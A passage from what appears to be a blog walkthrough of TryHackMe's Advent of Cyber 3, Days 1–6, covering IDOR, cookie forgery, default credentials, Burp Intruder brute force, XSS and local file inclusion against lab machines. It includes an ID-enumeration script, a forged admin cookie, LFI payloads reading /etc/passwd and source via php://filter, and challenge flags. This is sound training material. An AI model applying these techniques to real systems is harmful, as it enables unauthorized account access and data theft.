</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hidden&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user_id&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;123&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>div</span>&gt;New Password:&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>div</span>&gt;&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;new_password&#34;</span>&gt;&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>div</span>&gt;&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Change Password&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>form</span>&gt;
</span></span></code></pre></div><p>&mldr; or in cookies:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>GET</span> /user-information <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>website.thm</span>
</span></span><span style=display:flex><span>Cookie<span style=color:#f92672>:</span> <span style=color:#ae81ff>user_id=9</span>
</span></span><span style=display:flex><span>User-Agent<span style=color:#f92672>:</span> <span style=color:#ae81ff>Mozilla/5.0 (Ubuntu;Linux) Firefox/94.0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Hello Jon!
</span></span></code></pre></div><p>And in reality, if you check public <a href=https://www.hackerone.com/>Hackerone</a> bug submissions, you will find a great portion of IDOR vulnerabilities there.</p><p>Now with all that knowledge, let&rsquo;s dive into our challenge.</p><p>Upon entering that website, we&rsquo;re welcomed with a homepage like this.</p><p><img loading=lazy src=/img/adventOfCyber3/day1/website_home.png#center alt></p><p><img loading=lazy src=/img/adventOfCyber3/day1/website_build.png#center alt></p><p><img loading=lazy src=/img/adventOfCyber3/day1/website_inventory.png#center alt></p><p>Click on anything clickable, we found out that nothing is clickable on those pages. That left us with only the page <code>Your Activity</code>.</p><p><img loading=lazy src=/img/adventOfCyber3/day1/website_activity.png#center alt></p><p>Without any obstacle, we can instantly find a textbook vulnerability. It lies here:</p><p><img loading=lazy src=/img/adventOfCyber3/day1/website_activity_url_bar.png#center alt></p><p>Remember, in programming languages, it usually starts from 0 rather than 1. But if we try <code>?user_id=0</code>, it will scream &ldquo;lol no user like that bro&rdquo;.</p><p><img loading=lazy src=/img/adventOfCyber3/day1/website_activity_id_0.png#center alt></p><p>But if we change that to <code>?user_id=1</code>:</p><p><img loading=lazy src=/img/adventOfCyber3/day1/website_activity_santa.png#center alt></p><p>Guess we&rsquo;re in. :D</p><p>In the wild, the number of possibilities to test is simply too massive to manually try it all. So the best way is to use on-the-spot scripts like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>address: str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;https://inventory-management.thm/activity&#34;</span>
</span></span><span style=display:flex><span>startId: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>testRange: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>20</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> id <span style=color:#f92672>in</span> range(startId, startId <span style=color:#f92672>+</span> testRange):
</span></span><span style=display:flex><span>	response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(address, params<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;user_id&#34;</span>: id})
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> response<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span>:
</span></span><span style=display:flex><span>		print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found something at </span><span style=color:#e6db74>{</span>address<span style=color:#e6db74>}</span><span style=color:#e6db74>?user_id=</span><span style=color:#e6db74>{</span>id<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><p>Just iteratively try that id out, we also find McStocker&rsquo;s account at <code>https://inventory-management.thm/activity?user_id=3</code>.</p><p><img loading=lazy src=/img/adventOfCyber3/day1/website_activity_mcstocker.png#center alt></p><p>And another at <code>?user_id=9</code>:</p><p><img loading=lazy src=/img/adventOfCyber3/day1/website_activity_grinch.png#center alt></p><p>And when we click on all those <code>revert</code> (as our instinct tell us to do so), we got the final flag.</p><p><img loading=lazy src=/img/adventOfCyber3/day1/website_activity_revert.gif#center alt></p><p>To conclude, our flags today are:</p><p><code>After finding Santa's account, what is their position in the company?</code>
The Boss!</p><p><code>After finding McStocker's account, what is their position in the company?</code>
Build Manager</p><p><code>After finding the account responsible for tampering, what is their position in the company?</code>
Mischief Manager</p><p><code>What is the received flag when McSkidy fixes the Inventory Management System?</code>
THM{AOC_IDOR_2B34BHI3}</p><h2 id=day-2-web-exploitation-elf-hr-problems>[Day 2] <code>Web Exploitation</code>: Elf HR Problems<a hidden class=anchor aria-hidden=true href=#day-2-web-exploitation-elf-hr-problems>#</a></h2><p><img loading=lazy src=/img/adventOfCyber3/day2/title.png#center alt></p><p>So in short, today&rsquo;s learning objective is fundamental knowledge about the WWW. You can skip all the text below and jump right to answers if you&rsquo;ve already had experience working with the web.</p><p>Since this is actually a vast topic, I&rsquo;ll try keeping things simple by omitting the details. If you want to learn more in-depth about web technologies (which you should, because it&rsquo;s like Hello World for pentesters and developers alike), I suggest the great <a href=https://developer.mozilla.org/en-US/docs/Learn>Mozilla Docs</a>, where they&rsquo;ve explained everything with great details.</p><p>First things first, HTTP.</p><p>You are reading this article, on the Internet, from your browser, aren&rsquo;t you?</p><p>Then I hope you&rsquo;re using a computer. Press Ctr+U, or right click and <code>View Page Source</code>, you should see something like this:
<img loading=lazy src=/img/adventOfCyber3/day2/thm_html.png#center alt></p><p>As you can see, this is the true nature of the Web - Hypertext. A bunch of codes define what a page contain, how does it look, what will it do, and so on.</p><p>When people talk about HTTP, they&rsquo;re talking about the way in which such Hypertext are transferred among computers - sending request, and waiting to be responded (imagine you messaging with someone). An example request:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>GET</span> / <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>tryhackme.com</span>
</span></span><span style=display:flex><span>User-Agent<span style=color:#f92672>:</span> <span style=color:#ae81ff>Mozilla/5.0 Firefox/87.0</span>
</span></span><span style=display:flex><span>Referer<span style=color:#f92672>:</span> <span style=color:#ae81ff>https://tryhackme.com/</span>
</span></span></code></pre></div><p>And an example respond:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>200</span> <span style=color:#a6e22e>OK</span>
</span></span><span style=display:flex><span>Server<span style=color:#f92672>:</span> <span style=color:#ae81ff>nginx/1.15.8</span>
</span></span><span style=display:flex><span>Date<span style=color:#f92672>:</span> <span style=color:#ae81ff>Wednesday, 24 Nov 2021 13:34:03 GMT</span>
</span></span><span style=display:flex><span>Content-Type<span style=color:#f92672>:</span> <span style=color:#ae81ff>text/html</span>
</span></span><span style=display:flex><span>Content-Length<span style=color:#f92672>:</span> <span style=color:#ae81ff>98</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>title</span>&gt;Advent of Cyber&lt;/<span style=color:#f92672>title</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>    Welcome To Advent of Cyber!
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></div><p>As you can see, Hypertext is also in the respond. The browser render that, then showing you the page - all happened in the matter of miliseconds.</p><p>HTTPS is HTTP, but more secure, since it&rsquo;s encrypted.</p><p>On the other hand, cookie is a something sent back and forth among computers, to identify who you are.</p><p>On your browser, press <code>F12</code> to open Dev Tools, find <code>Cookies</code> tab, somewhere in <code>Storage</code> or <code>Application</code>. The yummy cookies should be there. And since cookies are stored locally on your computer, it can be changed however we want.</p><p>Equipped with all that knowledge, here comes the challenge!</p><p>Get into the <a href=https:///img/adventOfCyber3/day3-labs.tryhackme#center.cloud/sites/aoc-cookies/>challenge page</a>, we see an ordinary login form.</p><p><img loading=lazy src=/img/adventOfCyber3/day2/best_festival_company_login.png#center alt></p><p>Let&rsquo;s register an account!</p><p><img loading=lazy src=/img/adventOfCyber3/day2/best_festival_register.png#center alt></p><p>&mldr; okay? (&rsquo;-')</p><p>Checking DevTool, we can find a cookie like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>user-auth:&#34;7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a22746573746572227d&#34;
</span></span></span></code></pre></div><p>It&rsquo;s not very readable. So let&rsquo;s try to decode it with <a href=https://gchq.github.io/CyberChef/>CyberChef</a>.</p><p><img loading=lazy src=/img/adventOfCyber3/day2/cookie_cyberchef.png#center alt></p><p>(If you find the image too small to read, why don&rsquo;t open up another tab and decode it? :D)</p><p>We can see that the cookie is stored in <code>JSON</code> format, encoded in hexadecimal.</p><p>Changing out username to <code>admin</code> (as the task told us to), then copy-pasting it to DevTool&mldr;</p><p><img loading=lazy src=/img/adventOfCyber3/day2/best_festival_dashboard.png#center alt></p><p>This is certified &ldquo;I&rsquo;m in&rdquo; moment. :D</p><p>From there, we can get all needed information to answer the questions:</p><p><code>What is the name of the new cookie that was created for your account?</code></p><p>user-auth</p><p><code>What encoding type was used for the cookie value?</code></p><p>hexadecimal</p><p><code>What object format is the data of the cookie stored in?</code></p><p>json</p><p><code>What is the value of the administrator cookie? (username = admin)</code></p><pre tabindex=0><code>7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d
</code></pre><p><code>What team environment is not responding?</code></p><p>HR</p><p><code>What team environment has a network warning?</code></p><p>Application</p><p><img loading=lazy src=/img/adventOfCyber3/day2/answers.png#center alt></p><h2 id=day-3-web-exploitation-christmas-blackout>[Day 3] <code>Web Exploitation</code>: Christmas Blackout<a hidden class=anchor aria-hidden=true href=#day-3-web-exploitation-christmas-blackout>#</a></h2><p><img loading=lazy src=/img/adventOfCyber3/day3/title.png#center alt></p><p>Okay, long story short, content discovery and authentication bypass. Absolutely useful in real life applications.</p><p>There&rsquo;s not much to say about this, since everything we&rsquo;re gonna do is bruteforcing the credentials. One reminder, thou, is that in real life bruteforcing is nowhere near as effective as it&rsquo;s in ctfs, and let&rsquo;s be grateful for that. :D</p><p><img loading=lazy src=/img/adventOfCyber3/day3/gobuster.gif#center alt></p><p>And just like that, we&rsquo;ve got the location of admin panel.</p><p>From here, we usually use specialised tools like <a href=https://github.com/vanhauser-thc/thc-hydra>Hydra</a>. However we&rsquo;ve already been given a wordlist with only 3 entries in this case, which&rsquo;s saved us from the hassle of writing lengthy commands. :D</p><p>Manually test the entries, we got it at <code>administrator:administrator</code>.</p><p><img loading=lazy src=/img/adventOfCyber3/day3/admin_login.png#center alt></p><p>Another way to do that is taking a look at <a href=http://10.10.235.89/admin/login-page.js>the JS file</a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>loginForm</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;login-form&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>loginButton</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;login-form-submit&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>loginErrorMsg</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;login-error-msg&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>loginButton</span>.<span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;click&#34;</span>, (<span style=color:#a6e22e>e</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>e</span>.<span style=color:#a6e22e>preventDefault</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>loginForm</span>.<span style=color:#a6e22e>username</span>.<span style=color:#a6e22e>value</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>loginForm</span>.<span style=color:#a6e22e>password</span>.<span style=color:#a6e22e>value</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;administrator&#34;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;administrator&#34;</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#34;You have successfully logged in.&#34;</span>);
</span></span><span style=display:flex><span>        window.<span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#39;dc7161be3dbf2250c8954e5.html&#39;</span>);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>loginErrorMsg</span>.<span style=color:#a6e22e>style</span>.<span style=color:#a6e22e>opacity</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>})
</span></span></code></pre></div><p>We can clearly see username and password written in plaintext, and even the &ldquo;secret&rdquo; location it&rsquo;ll redirect us to. Again, in real life, no sane developer do this. However, let&rsquo;s just be chill in this ctf-only &ldquo;I&rsquo;m in&rdquo; moment and move on! xD</p><p><img loading=lazy src=/img/adventOfCyber3/day3/admin_dashboard.png#center alt></p><p>Having accessed to the admin panel, now we&rsquo;ve got all flags needed for the questions!</p><p><code>Using a common wordlist for discovering content, enumerate http://10.10.235.89 to find the location of the administrator dashboard. What is the name of the folder?</code>
admin</p><p><code>In your web browser, try some default credentials on the newly discovered login form for the "administrator" user. What is the password?</code>
administrator</p><p><code>Access the admin panel. What is the value of the flag?</code>
THM{ADM1N_AC3SS}</p><p><img loading=lazy src=/img/adventOfCyber3/day3/answers.png#center alt></p><h2 id=day-4-web-exploitation-santas-running-behind>[Day 4] <code>Web Exploitation</code>: Santa&rsquo;s running behind<a hidden class=anchor aria-hidden=true href=#day-4-web-exploitation-santas-running-behind>#</a></h2><p><img loading=lazy src=/img/adventOfCyber3/day4/title.png#center alt></p><p>Today&rsquo;s learning material is relatively short and concise. So in case you haven&rsquo;t, please go to <a href=https://tryhackme.com/room/adventofcyber3>Day 4 tutorial here</a>.</p><p>One small reminder, thou: Burpsuite is (in)famous for its avaricious RAM usage, so if you run it in a virtual machine, watch out for sudden halts.</p><p>Another thing: Burp Suite&rsquo;s built in browser&rsquo;s become fantastic nowadays - a separate Firefox with FoxyProxy is no longer needed.</p><p>One final extra note: If you, for some reason, don&rsquo;t want or can&rsquo;t afford the Burp Suite pro version, or just genuinely support the idea of open-source softwares, then try to take a look at <a href=https://www.zaproxy.org/>ZAP</a>. On my own, I find Burp Suite&rsquo;s UI more intuitive, but ZAP&rsquo;s much more powerful once you get the hang of it.</p><p>With all that being said, let&rsquo;s jump in. :D</p><p><img loading=lazy src=/img/adventOfCyber3/day4/form.png#center alt></p><p>We&rsquo;re greeted with a basic login form like this. Neither the source code or default credentials revealed anything special.</p><p>Based on task&rsquo;s requirements, seems like all we&rsquo;ve to do&rsquo;s to bruteforce it. Let me show you the cool way to do it. :D</p><p><img loading=lazy src=/img/adventOfCyber3/day4/hydra.gif#center alt></p><p>&mldr; or not&mldr; Weird. :L</p><p>Let&rsquo;s burn our RAM and open up Burp Suite, then.</p><p>Here&rsquo;s the POST request we intercepted:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>POST</span> / <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host: 10.10.154.103
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Content-Length: 45
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Cache-Control: max-age=0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: 1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Origin: http://10.10.154.103
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Referer: http://10.10.154.103/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q=0.9
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Cookie: PHPSESSID=c3k9aqaa365sapdv67vh3p3bte
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>username=santa&amp;password=password&amp;submit=Login
</span></span></code></pre></div><p>Let&rsquo;s Ctrl+I to send it to <code>Intruder</code>.</p><p>The first <code>Target</code> tab, default options are fine. On the second <code>Positions</code> tab, make sure that you only insert payloads in password field:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>POST</span> / <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host: 10.10.154.103
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Content-Length: 45
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Cache-Control: max-age=0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: 1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Origin: http://10.10.154.103
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Referer: http://10.10.154.103/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q=0.9
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Cookie: PHPSESSID=c3k9aqaa365sapdv67vh3p3bte
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>username=santa&amp;password=§password§&amp;submit=Login
</span></span></code></pre></div><p>Now continues to <code>Payload</code> tab. Since we&rsquo;ve already had a nice small password list, let&rsquo;s copy it and <code>Paste</code>.</p><p><img loading=lazy src=/img/adventOfCyber3/day4/payload.png#center alt></p><p>It all looks good now. Let&rsquo;s press <code>Start Attack</code> on upper right side. Here&rsquo;s the result:</p><p><img loading=lazy src=/img/adventOfCyber3/day4/bruteforce.png#center alt></p><p>Based on the length, we can easily spot the unique one.</p><p>Having had all that information, let&rsquo;s login to santa&rsquo;s account!</p><p><img loading=lazy src=/img/adventOfCyber3/day4/santa_account.png#center alt></p><p>And here comes the last flag!</p><p>So our flags today are:</p><p><code>What valid password can you use to access the "santa" account?</code>
cookie</p><p><code>What is the flag in Santa's itinerary?</code>
THM{SANTA_DELIVERS}</p><p><img loading=lazy src=/img/adventOfCyber3/day4/answers.png#center alt></p><h2 id=day-5-web-exploitation-pesky-elf-forum>[Day 5] <code>Web Exploitation</code>: Pesky Elf Forum<a hidden class=anchor aria-hidden=true href=#day-5-web-exploitation-pesky-elf-forum>#</a></h2><p><img loading=lazy src=/img/adventOfCyber3/day5/task.png#center alt></p><p>Our learning objective today is, yeah, <a href=https://portswigger.net/web-security/cross-site-scripting>Cross-Site Scripting aka XSS vulnerability</a>.</p><p>As XSS itself is an endless topic, I&rsquo;ll leave the explaining part to <a href=https://portswigger.net/web-security/cross-site-scripting>Portswigger&rsquo;s post</a>. It has intelligible visualization of XSS concepts, so you should definitely check it out.</p><p>So, in short, XSS is injecting Javascript code to do things attackers want. With that being said, let&rsquo;s jump in.</p><p>&mldr;</p><p>Actually, hasn&rsquo;t the challenge description itself done all the hassle for us? Isn&rsquo;t it revealing too much? &lt;(￣﹌￣)></p><p>Basically this&rsquo;s what&rsquo;s going to happen if you change your password.
<img loading=lazy src=/img/adventOfCyber3/day5/change-password.png#center alt></p><p>In real life, whoever implemented this password changing function must be reprimanded ASAP. But as it&rsquo;s a ctf challenge, let&rsquo;s now gratefully exploit it. (￣▽￣)</p><p><em>Strictly</em> follow the challenge&rsquo;s instruction, let&rsquo;s comment this on all pages.
<img loading=lazy src=/img/adventOfCyber3/day5/xss.png#center alt></p><p>Shortly after, we got in <code>Grinch</code> user&rsquo;s account.
<img loading=lazy src=/img/adventOfCyber3/day5/grinch.png#center alt></p><p>Here&rsquo;s the answer for today&rsquo;s challenge.
<img loading=lazy src=/img/adventOfCyber3/day5/answer.png#center alt></p><h2 id=day-6-web-exploitation-patch-management-is-hard>[Day 6] <code>Web Exploitation</code>: Patch Management Is Hard<a hidden class=anchor aria-hidden=true href=#day-6-web-exploitation-patch-management-is-hard>#</a></h2><p>Today&rsquo;s learning objective is <a href=https://www.neuralegion.com/blog/local-file-inclusion-lfi/>LFI - local file inclusion</a>.</p><p>Normally if you keep default Apache/Nginx configuration, LFI shouldn&rsquo;t happen, but as an attacker it&rsquo;s certainly worth a try.</p><p>To keep it short, local file inclusion is - as you may guess - a vulnerability that let attackers access local files on the machine.</p><p>Sometimes, LFI leads to <a href=https://www.bugcrowd.com/glossary/remote-code-execution-rce/>RCE</a>, mostly via log
files (log poinsoning) or PHP session - whatever means that you can store your
arbitrary code, in order to execute it from PHP filter later on.</p><p>Okay, enough theory, let&rsquo;s dive in. :D</p><p>Upon visiting the page, we see this:</p><p><img loading=lazy src=/img/adventOfCyber3/day6/homepage.png#center alt></p><p>And as you can see, the entry point is literally in the request URL:</p><p><img loading=lazy src=/img/adventOfCyber3/day6/link.png#center alt></p><p>Before we get started, let&rsquo;s test if this server is vulnerable to LFI. :D</p><pre tabindex=0><code>http://10.10.132.156/index.php?err=/etc/passwd
</code></pre><p><img loading=lazy src=/img/adventOfCyber3/day6/passwd.png#center alt></p><p>It&rsquo;s. So it&rsquo;s not hard to read the first flag:</p><pre tabindex=0><code>http://10.10.16.195/index.php?err=/etc/flag
</code></pre><p><img loading=lazy src=/img/adventOfCyber3/day6/first-flag.png#center alt></p><p>But if we try to use the very same method to access <code>index.php</code> file, we&rsquo;ll get an error.</p><pre tabindex=0><code>http://10.10.16.195/index.php?err=index.php
</code></pre><p><img loading=lazy src=/img/adventOfCyber3/day6/index-err.png#center alt></p><p>Since the <code>index.php</code> file also include <code>header.php</code>, and they both declare <code>getuseragent()</code> function, we
cannot access it directly. Therefore, let&rsquo;s access it through PHP filter:</p><pre tabindex=0><code>http://10.10.16.195/index.php?err=php://filter/resource=index.php
</code></pre><p><img loading=lazy src=/img/adventOfCyber3/day6/index-err.png#center alt></p><p>Seems no better. Why? Because the functions are still there. So let&rsquo;s try to encode it in base64.</p><pre tabindex=0><code>http://10.10.16.195/index.php?err=php://filter/convert.base64-encode/resource=index.php
</code></pre><p>The server returned a very long base64 string - much longer than a simple error should be, which meant a
different result.</p><p>Here&rsquo;s that string, base64 decoded:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/ctf/thm/adventOfCyber3/day6<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─$ echo <span style=color:#e6db74>&#34;PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8+CjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICA8L2Rpdj4KICA8ZGl2IGNsYXNzPSJjb2wtbGctOCBjb2wtb2Zmc2V0LTEiPgogICAgICA8P3BocCBpZiAoaXNzZXQoJGVycm9yKSkgeyA/PgogICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQgdGV4dC1kYW5nZXIiPjxiPjw/cGhwIGVjaG8gJGVycm9yOyA/PjwvYj48L3NwYW4+CiAgICAgIDw/cGhwIH0KCj8+CiA8cD5XZWxjb21lIDw/cGhwIGVjaG8gZ2V0VXNlck5hbWUoKTsgPz48L3A+Cgk8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiIHJvbGU9ImFsZXJ0Ij5UaGlzIHNlcnZlciBoYXMgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLiBOb3RlIEFsbCBhY3Rpb25zIHRvIHRoaXMgc2VydmVyIGFyZSBsb2dnZWQgaW4hPC9kaXY+IAoJPC9kaXY+Cjw/cGhwIGlmKCRlcnJJbmNsdWRlKXsgaW5jbHVkZSgkX0dFVFsnZXJyJ10pO30gPz4KPC9kaXY+Cgo8P3BocAp9Cj8+&#34;</span> | base64 -d 
</span></span><span style=display:flex><span>&lt;?php session_start<span style=color:#f92672>()</span>;
